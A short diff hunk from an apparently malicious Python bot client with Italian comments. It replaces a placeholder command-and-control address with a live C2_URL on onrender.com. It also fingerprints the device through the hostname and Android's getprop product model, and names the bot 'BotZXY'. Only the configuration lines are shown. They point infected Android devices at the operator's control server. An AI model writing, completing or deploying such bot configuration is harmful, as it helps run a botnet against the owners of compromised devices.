@@ -38,7 +38,7 @@ import threading
 from datetime import datetime
 
 # Configurazione
-C2_URL = "https://tuo-app.onrender.com"  # SOSTITUISCI
+C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
 DEVICE_ID = os.uname().nodename + "_" + os.popen('getprop ro.product.model').read().strip()[:8]
 BOT_NAME = "BotZXY"
 
